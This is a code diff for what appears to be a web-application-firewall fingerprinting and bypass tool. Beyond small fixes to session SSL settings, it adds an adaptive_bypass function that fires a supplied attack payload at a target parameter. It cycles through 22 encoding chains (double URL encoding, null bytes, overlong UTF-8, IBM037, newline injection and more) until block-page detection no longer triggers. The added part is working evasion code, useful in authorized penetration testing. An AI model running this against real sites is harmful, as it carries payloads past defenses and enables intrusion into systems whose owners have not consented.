@@ -189,7 +189,8 @@ BYPASS_PAYLOADS = {
 def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
                     timeout: float = 10.0) -> Dict:
     if sess is None:
-        sess = requests.Session(); sess.verify = settings.verify_ssl
+        sess = requests.Session()
+    sess.verify = settings.verify_ssl
     result = {"detected": False, "name": None, "evidence": [], "all_matches": []}
 
     probes = [
@@ -252,7 +253,8 @@ def generate_bypasses(vuln_type: str) -> List[str]:
 def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
           timeout: float = 10.0) -> Dict:
     if sess is None:
-        sess = requests.Session(); sess.verify = settings.verify_ssl
+        sess = requests.Session()
+    sess.verify = settings.verify_ssl
     result = {
         "waf": fingerprint_waf(url, sess, timeout),
         "bypasses": {},
@@ -514,6 +516,82 @@ class HTTPBypass:
             "X-HTTP-Method-Override": method,
             "X-Method-Override": method,
         }
+
+
+# ---------------------------------------------------------------------------
+# Adaptive bypass — detect WAF block and escalate encoding automatically
+# ---------------------------------------------------------------------------
+
+BLOCK_PATTERNS = [
+    r"(?i)blocked", r"(?i)denied", r"(?i)rejected",
+    r"(?i)security", r"(?i)firewall", r"(?i)waf",
+    r"(?i)please.*wait", r"(?i)challenge",
+    r"(?i)access.*forbidden", r"(?i)forbidden.*access",
+    r"(?i)your.*request.*has.*been.*blocked",
+    r"(?i)contact.*administrator",
+    r"cf-error-page", r"cf-ray",
+    r"Reference.*#\d+\.\w+",
+]
+
+
+def _detect_block(resp: requests.Response) -> bool:
+    if resp.status_code in (403, 406, 429, 503):
+        return True
+    if resp.status_code == 200 and len(resp.text) < 200:
+        for pat in BLOCK_PATTERNS:
+            if re.search(pat, resp.text):
+                return True
+    return False
+
+
+def adaptive_bypass(url: str, param: str, payload: str,
+                    sess: requests.Session, timeout: float = 10.0) -> Dict:
+    baseline = None
+    try:
+        r = sess.get(build_url(url, param, "NOMINAL_TEST"), timeout=timeout)
+        baseline = r
+    except Exception:
+        pass
+    encoders = BypassEncoder
+    strategies = [
+        [],
+        [encoders.url_encode],
+        [encoders.double_url_encode],
+        [encoders.case_random],
+        [encoders.case_random, encoders.url_encode],
+        [encoders.null_bytes],
+        [encoders.tab_injection],
+        [encoders.case_random, encoders.double_url_encode],
+        [encoders.hex_encode],
+        [encoders.overlong_utf8_encode],
+        [encoders.ibm037_encode],
+        [encoders.newline_injection],
+        [encoders.case_random, encoders.hex_encode],
+        [encoders.scientific_notation],
+        [encoders.negative_sign],
+        [encoders.unicode_url_encode],
+        [encoders.case_random, encoders.overlong_utf8_encode],
+        [encoders.case_random, encoders.tab_injection],
+        [encoders.case_random, encoders.newline_injection],
+        [encoders.case_random, encoders.null_bytes],
+        [encoders.case_random, encoders.double_url_encode, encoders.tab_injection],
+        [encoders.case_random, encoders.hex_encode, encoders.newline_injection],
+    ]
+    for i, strategy in enumerate(strategies):
+        encoded = apply_encoder_chain(payload, strategy)
+        try:
+            r = sess.get(build_url(url, param, encoded), timeout=timeout)
+            if _detect_block(r):
+                continue
+            if baseline and abs(len(r.text) - len(baseline.text)) > 50:
+                return {"success": True, "strategy_index": i, "payload": encoded[:60],
+                        "status": r.status_code, "length": len(r.text)}
+            if r.status_code in (200, 302) and len(r.text) > 100:
+                return {"success": True, "strategy_index": i, "payload": encoded[:60],
+                        "status": r.status_code, "length": len(r.text)}
+        except Exception as e:
+            logger.debug("adaptive_bypass %d: %s", i, e)
+    return {"success": False, "strategies_tried": len(strategies)}
 
 
 WAF_BYPASS_STRATEGIES: Dict[str, Dict] = {
@@ -916,7 +994,8 @@ def test_waf_strength(url: str, sess: requests.Session,
 def heavy_check(url: str, param: str = None, sess: Optional[requests.Session] = None,
                 timeout: float = 10.0) -> Dict:
     if sess is None:
-        sess = requests.Session(); sess.verify = settings.verify_ssl
+        sess = requests.Session()
+    sess.verify = settings.verify_ssl
     result = {
         "vulnerable": False,
         "findings": [],
